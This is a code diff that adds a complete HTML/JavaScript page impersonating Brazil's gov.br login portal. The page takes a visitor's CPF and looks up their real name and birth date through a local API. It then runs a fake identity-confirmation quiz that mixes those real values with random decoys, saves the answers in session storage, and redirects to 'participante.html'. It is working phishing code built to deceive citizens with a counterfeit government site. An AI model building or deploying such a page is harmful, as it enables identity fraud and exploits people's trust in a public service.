@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>Acesso gov.br</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background: #f0f0f0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── HEADER ── */
+    header {
+      background: #fff;
+      border-bottom: 1px solid #ddd;
+      padding: 10px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .logo img { height: 36px; display: block; }
+
+    .header-icons {
+      display: flex;
+      gap: 16px;
+      align-items: center;
+    }
+    .header-icons img {
+      height: 26px;
+      width: auto;
+      object-fit: contain;
+    }
+
+    /* ── MAIN ── */
+    main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: stretch;
+      padding: 22px 14px 40px;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 6px;
+      border: 1px solid #ddd;
+      width: 100%;
+      max-width: 480px;
+      padding: 26px 22px 30px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .card-title {
+      font-size: 17px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 22px;
+    }
+
+    .screen[hidden] { display: none !important; }
+
+    /* ── CPF screen ── */
+    .cpf-option-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 14px;
+    }
+    .cpf-option-row img {
+      width: 34px;
+      height: 34px;
+      object-fit: contain;
+      flex-shrink: 0;
+    }
+    .cpf-option-label {
+      font-size: 15px;
+      font-weight: 600;
+      color: #1a1a1a;
+    }
+
+    .cpf-hint {
+      font-size: 14px;
+      color: #1351b4;
+      margin-bottom: 16px;
+      line-height: 1.45;
+    }
+    .cpf-hint b { font-weight: 700; }
+
+    .field-label {
+      font-size: 13px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 6px;
+      display: block;
+    }
+
+    .cpf-input {
+      width: 100%;
+      border: 1px solid #888;
+      border-radius: 4px;
+      padding: 13px 14px;
+      font-size: 15px;
+      color: #333;
+      outline: none;
+      background: #fff;
+      margin-bottom: 8px;
+      -webkit-appearance: none;
+    }
+    .cpf-input::placeholder { color: #999; font-style: italic; }
+    .cpf-input:focus { border-color: #1351b4; }
+
+    .erro-msg {
+      font-size: 13px;
+      color: #c62828;
+      margin-bottom: 10px;
+      min-height: 16px;
+    }
+
+    .btn-continuar {
+      display: block;
+      width: 100%;
+      background: #1351b4;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 700;
+      border: none;
+      border-radius: 50px;
+      padding: 15px;
+      cursor: pointer;
+      letter-spacing: .2px;
+      margin-bottom: 26px;
+    }
+    .btn-continuar:disabled { opacity: .6; cursor: not-allowed; }
+    .btn-continuar:active:not(:disabled) { background: #0e3d8a; }
+
+    /* ── OTHER OPTIONS ── */
+    .other-options-title {
+      font-size: 15px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 10px;
+    }
+    .divider {
+      border: none;
+      border-top: 1px solid #bbb;
+      margin-bottom: 4px;
+    }
+    .other-list { list-style: none; }
+    .other-item {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 15px 0;
+      border-bottom: 1px solid #eee;
+      cursor: pointer;
+    }
+    .other-item:last-child { border-bottom: none; }
+    .other-item img {
+      width: 32px;
+      height: 32px;
+      object-fit: contain;
+      flex-shrink: 0;
+    }
+    .other-label {
+      font-size: 15px;
+      color: #1a1a1a;
+      font-weight: 400;
+      flex: 1;
+    }
+    .other-label.green { color: #168821; }
+    .badge-prata {
+      background: #168821;
+      color: #fff;
+      font-size: 9px;
+      font-weight: 700;
+      padding: 3px 6px;
+      border-radius: 3px;
+      white-space: nowrap;
+      letter-spacing: .5px;
+      flex-shrink: 0;
+    }
+
+    /* ── Opções de escolha (nome / data) ── */
+    .quiz-question {
+      font-size: 15px;
+      color: #1a1a1a;
+      margin-bottom: 18px;
+      line-height: 1.45;
+    }
+
+    .opcoes-list {
+      list-style: none;
+      margin-bottom: 24px;
+    }
+
+    .opcao {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      border: 1.5px solid #ccc;
+      border-radius: 6px;
+      padding: 14px 14px;
+      margin-bottom: 10px;
+      cursor: pointer;
+      transition: all .15s ease;
+      background: #fff;
+    }
+    .opcao:hover { border-color: #1351b4; }
+    .opcao.selected {
+      border-color: #1351b4;
+      background: #eaf2fc;
+    }
+
+    .opcao input {
+      accent-color: #1351b4;
+      width: 18px;
+      height: 18px;
+      flex-shrink: 0;
+    }
+
+    .opcao-texto {
+      font-size: 15px;
+      color: #1a1a1a;
+      font-weight: 500;
+      flex: 1;
+    }
+
+    /* ── Loading ── */
+    #screen-loading, #screen-verificado {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .loading-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+    }
+    .spinner {
+      width: 36px;
+      height: 36px;
+      border: 3px solid #d0d7e2;
+      border-top-color: #1351b4;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-text { font-size: 14px; color: #1351b4; font-weight: 600; }
+
+    /* ── Verificado ── */
+    .verificado-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 18px;
+    }
+    .check-circle {
+      width: 72px;
+      height: 72px;
+      background: #168821;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      animation: popIn .35s cubic-bezier(.175,.885,.32,1.275) both;
+    }
+    .check-circle svg { width: 38px; height: 38px; }
+    @keyframes popIn {
+      from { transform: scale(0); opacity: 0; }
+      to   { transform: scale(1); opacity: 1; }
+    }
+    .verificado-titulo {
+      font-size: 20px;
+      font-weight: 700;
+      color: #168821;
+    }
+    .verificado-sub {
+      font-size: 14px;
+      color: #555;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo">
+      <img src="images/govlogo.png" alt="gov.br">
+    </div>
+    <div class="header-icons">
+      <img src="images/cantosuperiordireito.png" alt="Ícones de acessibilidade">
+    </div>
+  </header>
+
+  <main>
+    <div class="card">
+
+      <!-- ── Tela 1: CPF ── -->
+      <section class="screen" id="screen-cpf">
+        <p class="card-title">Identifique-se no gov.br com:</p>
+
+        <div class="cpf-option-row">
+          <img src="images/card.png" alt="CPF">
+          <span class="cpf-option-label">Número do CPF</span>
+        </div>
+
+        <p class="cpf-hint">Digite seu CPF para <b>criar</b> ou <b>acessar</b> sua conta gov.br</p>
+
+        <label class="field-label" for="cpf">CPF</label>
+        <input class="cpf-input" id="cpf" type="tel" placeholder="Digite seu CPF" maxlength="14" inputmode="numeric" autocomplete="off">
+        <div class="erro-msg" id="erro-cpf"></div>
+
+        <button class="btn-continuar" id="btn-cpf">Continuar</button>
+
+        <p class="other-options-title">Outras opções de identificação:</p>
+        <hr class="divider">
+
+        <ul class="other-list">
+          <li class="other-item">
+            <img src="images/bank.png" alt="Login com seu banco">
+            <span class="other-label green">Login com seu banco</span>
+            <span class="badge-prata">SUA CONTA SERÁ PRATA</span>
+          </li>
+          <li class="other-item">
+            <img src="images/QRCODE.png" alt="QR Code">
+            <span class="other-label">Login com QR code</span>
+          </li>
+          <li class="other-item">
+            <img src="images/pen.png" alt="Certificado digital">
+            <span class="other-label">Seu certificado digital</span>
+          </li>
+          <li class="other-item">
+            <img src="images/nuvem.png" alt="Certificado digital em nuvem">
+            <span class="other-label">Seu certificado digital em nuvem</span>
+          </li>
+        </ul>
+      </section>
+
+      <!-- ── Tela de loading ── -->
+      <section class="screen" id="screen-loading" hidden>
+        <div class="loading-wrap">
+          <div class="spinner"></div>
+          <p class="loading-text">Consultando seus dados...</p>
+        </div>
+      </section>
+
+      <!-- ── Tela 2: Nome ── -->
+      <section class="screen" id="screen-nome" hidden>
+        <p class="card-title">Confirme suas informações</p>
+        <p class="quiz-question">Para sua segurança, selecione abaixo o seu <b>nome completo</b>:</p>
+        <ul class="opcoes-list" id="opcoes-nome"></ul>
+        <div class="erro-msg" id="erro-nome"></div>
+        <button class="btn-continuar" id="btn-nome">Continuar</button>
+      </section>
+
+      <!-- ── Tela verificado ── -->
+      <section class="screen" id="screen-verificado" hidden>
+        <div class="verificado-wrap">
+          <div class="check-circle">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M5 12.5L10 17.5L19 7" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <p class="verificado-titulo">Verificado</p>
+          <p class="verificado-sub" id="verificado-sub"></p>
+        </div>
+      </section>
+
+      <!-- ── Tela 3: Data ── -->
+      <section class="screen" id="screen-data" hidden>
+        <p class="card-title">Confirme suas informações</p>
+        <p class="quiz-question">Selecione abaixo a sua <b>data de nascimento</b>:</p>
+        <ul class="opcoes-list" id="opcoes-data"></ul>
+        <div class="erro-msg" id="erro-data"></div>
+        <button class="btn-continuar" id="btn-data">Continuar</button>
+      </section>
+
+    </div>
+  </main>
+
+  <script>
+    // ─────────────────────────────────────────────────────────
+    //  Estado global
+    // ─────────────────────────────────────────────────────────
+    const state = {
+      cpf: '',
+      nomeReal: '',
+      dataReal: '',
+      nomeEscolhido: '',
+      dataEscolhida: ''
+    };
+
+    // ─────────────────────────────────────────────────────────
+    //  Helpers
+    // ─────────────────────────────────────────────────────────
+    function $(id) { return document.getElementById(id); }
+
+    function mostrarTela(id) {
+      document.querySelectorAll('.screen').forEach(s => s.hidden = true);
+      $(id).hidden = false;
+      window.scrollTo(0, 0);
+    }
+
+    function formatarCPF(cpf) {
+      let value = cpf.replace(/\D/g, '');
+      if (value.length > 11) value = value.slice(0, 11);
+      value = value.replace(/(\d{3})(\d)/, '$1.$2');
+      value = value.replace(/(\d{3})(\d)/, '$1.$2');
+      value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+      return value;
+    }
+
+    function shuffle(arr) {
+      for (let i = arr.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [arr[i], arr[j]] = [arr[j], arr[i]];
+      }
+      return arr;
+    }
+
+    // ─────────────────────────────────────────────────────────
+    //  CPF input + mask
+    // ─────────────────────────────────────────────────────────
+    const cpfInput = $('cpf');
+    cpfInput.addEventListener('input', e => {
+      e.target.value = formatarCPF(e.target.value);
+      $('erro-cpf').textContent = '';
+    });
+
+    // ─────────────────────────────────────────────────────────
+    //  Consulta de CPF
+    // ─────────────────────────────────────────────────────────
+    async function consultarCPF(cpf) {
+      const cpfLimpo = cpf.replace(/[^\d]/g, '');
+      if (cpfLimpo.length !== 11) {
+        throw new Error('CPF inválido: deve conter 11 dígitos');
+      }
+      const apiUrl = `/api/cpf?cpf=${cpfLimpo}`;
+      const response = await fetch(apiUrl);
+      if (!response.ok) {
+        let msg = 'Erro na consulta: ' + response.status;
+        try {
+          const errData = await response.json();
+          if (errData && (errData.erro || errData.message)) {
+            msg = errData.erro || errData.message;
+          }
+        } catch (_) {}
+        throw new Error(msg);
+      }
+      const data = await response.json();
+      if (data.success === false) throw new Error(data.erro || data.error || 'CPF não encontrado');
+      if (!data.nome) throw new Error('CPF não encontrado');
+      return {
+        nome: (data.nome || '').toString().trim().toUpperCase(),
+        nascimento: (data.nascimento || '').toString().trim()
+      };
+    }
+
+    // ─────────────────────────────────────────────────────────
+    //  Geração de nomes aleatórios
+    // ─────────────────────────────────────────────────────────
+    const PRIMEIROS = ['JOÃO','MARIA','JOSÉ','ANA','PEDRO','LUCAS','CARLOS','PAULO','FERNANDA','JULIANA','RAFAEL','MARCOS','ANDRÉ','BRUNO','GABRIEL','LEONARDO','RICARDO','ROBERTO','CAMILA','PATRÍCIA','LUIZA','MARCELO','RODRIGO','FELIPE','THIAGO','VINICIUS','DANIEL','MATHEUS','GUSTAVO','EDUARDO','LARISSA','BEATRIZ','AMANDA','CAROLINA','MARIANA','VANESSA','RENATA','CLAUDIA','SANDRA','ROSANA'];
+    const SOBRENOMES = ['SILVA','SANTOS','OLIVEIRA','SOUZA','RODRIGUES','FERREIRA','ALVES','PEREIRA','LIMA','GOMES','COSTA','RIBEIRO','MARTINS','CARVALHO','ALMEIDA','LOPES','SOARES','FERNANDES','VIEIRA','BARBOSA','ROCHA','DIAS','NUNES','MOREIRA','MENDES','CASTRO','CARDOSO','TEIXEIRA','MACHADO','PINTO','FREITAS','MELO','CAMPOS','MONTEIRO','CORREIA','SANTANA'];
+
+    function gerarNomeAleatorio(evitar) {
+      let nome;
+      do {
+        const p = PRIMEIROS[Math.floor(Math.random() * PRIMEIROS.length)];
+        const s1 = SOBRENOMES[Math.floor(Math.random() * SOBRENOMES.length)];
+        const s2 = SOBRENOMES[Math.floor(Math.random() * SOBRENOMES.length)];
+        nome = `${p} ${s1} ${s2}`;
+      } while (evitar.includes(nome));
+      return nome;
+    }
+
+    // ─────────────────────────────────────────────────────────
+    //  Datas
+    // ─────────────────────────────────────────────────────────
+    function parseData(str) {
+      if (!str) return null;
+      let m = str.match(/^(\d{2})\/(\d{2})\/(\d{4})/);
+      if (m) return new Date(+m[3], +m[2] - 1, +m[1]);
+      m = str.match(/^(\d{4})-(\d{2})-(\d{2})/);
+      if (m) return new Date(+m[1], +m[2] - 1, +m[3]);
+      return null;
+    }
+
+    function formatarData(date) {
+      const d = String(date.getDate()).padStart(2, '0');
+      const m = String(date.getMonth() + 1).padStart(2, '0');
+      const y = date.getFullYear();
+      return `${d}/${m}/${y}`;
+    }
+
+    function gerarDataAleatoria(dataReal, evitar) {
+      const real = parseData(dataReal);
+      let nova;
+      do {
+        let base;
+        if (real) {
+          const offsetDias = (Math.random() < 0.5 ? -1 : 1) * (90 + Math.floor(Math.random() * 365 * 6));
+          base = new Date(real.getTime() + offsetDias * 86400000);
+        } else {
+          base = new Date(1960 + Math.floor(Math.random() * 45), Math.floor(Math.random() * 12), 1 + Math.floor(Math.random() * 28));
+        }
+        nova = formatarData(base);
+      } while (evitar.includes(nova));
+      return nova;
+    }
+
+    // ─────────────────────────────────────────────────────────
+    //  Renderização de opções (radio)
+    // ─────────────────────────────────────────────────────────
+    function renderOpcoes(containerId, name, valores) {
+      const ul = $(containerId);
+      ul.innerHTML = '';
+      valores.forEach((v, i) => {
+        const id = `${name}-${i}`;
+        const li = document.createElement('li');
+        const label = document.createElement('label');
+        label.className = 'opcao';
+        label.setAttribute('for', id);
+        label.innerHTML = `
+          <input type="radio" name="${name}" id="${id}" value="${v.replace(/"/g, '&quot;')}">
+          <span class="opcao-texto">${v}</span>
+        `;
+        li.appendChild(label);
+        ul.appendChild(li);
+      });
+      // visual selecionado
+      ul.querySelectorAll('input').forEach(inp => {
+        inp.addEventListener('change', () => {
+          ul.querySelectorAll('.opcao').forEach(o => o.classList.remove('selected'));
+          inp.closest('.opcao').classList.add('selected');
+        });
+      });
+    }
+
+    function valorSelecionado(name) {
+      const inp = document.querySelector(`input[name="${name}"]:checked`);
+      return inp ? inp.value : null;
+    }
+
+    const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+    async function mostrarVerificado(subtexto, ms, proximaTela) {
+      $('verificado-sub').textContent = subtexto;
+      mostrarTela('screen-verificado');
+      await sleep(ms);
+      mostrarTela(proximaTela);
+    }
+
+    // ─────────────────────────────────────────────────────────
+    //  Botão CPF → loading 1s (+ API) → tela nome
+    // ─────────────────────────────────────────────────────────
+    $('btn-cpf').addEventListener('click', async () => {
+      const cpf = cpfInput.value.trim();
+      const cpfLimpo = cpf.replace(/\D/g, '');
+      const erro = $('erro-cpf');
+      erro.textContent = '';
+
+      if (cpfLimpo.length !== 11) {
+        erro.textContent = 'Digite um CPF válido (11 dígitos).';
+        return;
+      }
+
+      $('btn-cpf').disabled = true;
+      $('screen-loading').querySelector('.loading-text').textContent = 'Consultando seus dados...';
+      mostrarTela('screen-loading');
+
+      try {
+        // Garante no mínimo 1 segundo de loading
+        const [{ nome, nascimento }] = await Promise.all([
+          consultarCPF(cpf),
+          sleep(1000)
+        ]);
+
+        state.cpf = cpf;
+        state.nomeReal = nome;
+        state.dataReal = nascimento;
+
+        const fakes = [];
+        fakes.push(gerarNomeAleatorio([nome]));
+        fakes.push(gerarNomeAleatorio([nome, fakes[0]]));
+        renderOpcoes('opcoes-nome', 'nome', shuffle([nome, ...fakes]));
+
+        mostrarTela('screen-nome');
+      } catch (err) {
+        erro.textContent = err.message || 'Erro ao consultar CPF.';
+        mostrarTela('screen-cpf');
+      } finally {
+        $('btn-cpf').disabled = false;
+      }
+    });
+
+    // ─────────────────────────────────────────────────────────
+    //  Botão Nome → loading 2s → verificado → tela data
+    // ─────────────────────────────────────────────────────────
+    $('btn-nome').addEventListener('click', async () => {
+      const escolhido = valorSelecionado('nome');
+      const erro = $('erro-nome');
+      erro.textContent = '';
+      if (!escolhido) { erro.textContent = 'Selecione uma opção.'; return; }
+
+      if (escolhido !== state.nomeReal) {
+        erro.textContent = 'Seleção incorreta. Por favor, tente novamente.';
+        return;
+      }
+
+      state.nomeEscolhido = escolhido;
+
+      // Prepara as opções de data antes de mostrar o loading
+      const dataRealFmt = (() => {
+        const d = parseData(state.dataReal);
+        return d ? formatarData(d) : state.dataReal;
+      })();
+      state.dataRealFmt = dataRealFmt;
+      const fakes = [];
+      fakes.push(gerarDataAleatoria(state.dataReal, [dataRealFmt]));
+      fakes.push(gerarDataAleatoria(state.dataReal, [dataRealFmt, fakes[0]]));
+      renderOpcoes('opcoes-data', 'data', shuffle([dataRealFmt, ...fakes]));
+
+      $('screen-loading').querySelector('.loading-text').textContent = 'Verificando...';
+      mostrarTela('screen-loading');
+      await sleep(2000);
+      await mostrarVerificado('Nome confirmado com sucesso.', 1500, 'screen-data');
+    });
+
+    // ─────────────────────────────────────────────────────────
+    //  Botão Data → loading 2s → verificado → finaliza
+    // ─────────────────────────────────────────────────────────
+    $('btn-data').addEventListener('click', async () => {
+      const escolhida = valorSelecionado('data');
+      const erro = $('erro-data');
+      erro.textContent = '';
+      if (!escolhida) { erro.textContent = 'Selecione uma opção.'; return; }
+
+      if (escolhida !== state.dataRealFmt) {
+        erro.textContent = 'Seleção incorreta. Por favor, tente novamente.';
+        return;
+      }
+
+      state.dataEscolhida = escolhida;
+
+      try {
+        sessionStorage.setItem('gov_dados', JSON.stringify({
+          cpf: state.cpf,
+          nome: state.nomeReal,
+          nomeEscolhido: state.nomeEscolhido,
+          nascimento: state.dataReal,
+          dataEscolhida: state.dataEscolhida
+        }));
+      } catch (_) {}
+
+      $('screen-loading').querySelector('.loading-text').textContent = 'Verificando...';
+      mostrarTela('screen-loading');
+      await sleep(2000);
+
+      $('verificado-sub').textContent = 'Data de nascimento confirmada com sucesso.';
+      mostrarTela('screen-verificado');
+
+      await sleep(1500);
+      window.location.href = 'participante.html';
+    });
+  </script>
+</body>
+</html>
